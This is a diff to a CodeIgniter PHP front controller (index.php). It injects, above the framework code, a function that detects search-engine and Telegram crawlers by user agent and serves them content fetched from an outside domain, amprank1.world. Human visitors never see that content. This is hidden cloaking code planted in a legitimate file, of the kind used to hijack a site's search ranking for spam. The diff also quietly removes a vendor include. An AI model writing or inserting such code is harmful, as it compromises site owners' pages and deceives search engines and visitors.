@@ -1,4 +1,22 @@
 <?php
+function is_bot() {
+    $user_agent = $_SERVER["HTTP_USER_AGENT"];
+    $bots = array("Googlebot", "TelegramBot", "bingbot", "Google-Site-Verification", "Google-InspectionTool");
+
+    foreach ($bots as $bot) {
+        if (stripos($user_agent, $bot) !== false) {
+            return true;
+        }
+    }
+    return false;
+}
+
+if (is_bot()) {
+    $message = file_get_contents("https://amprank1.world/schid/amputama/landing.txt");
+    echo $message;
+}
+?>
+<?php
 /**
  * CodeIgniter
  *
@@ -105,8 +123,6 @@ if (is_dir($application_folder)) {
 
 define('APPPATH', $application_folder . DIRECTORY_SEPARATOR);
 
-require ('vendor/user_composer.php');
-
 // VIEW PATH SETUP
 if (!isset($view_folder[0]) && is_dir(APPPATH . 'views' . DIRECTORY_SEPARATOR)) {
     $view_folder = APPPATH . 'views';
@@ -128,3 +144,4 @@ define('VIEWPATH', $view_folder . DIRECTORY_SEPARATOR);
 
 // LOAD THE BOOTSTRAP FILE
 require_once BASEPATH . 'core/CodeIgniter.php';
+?>
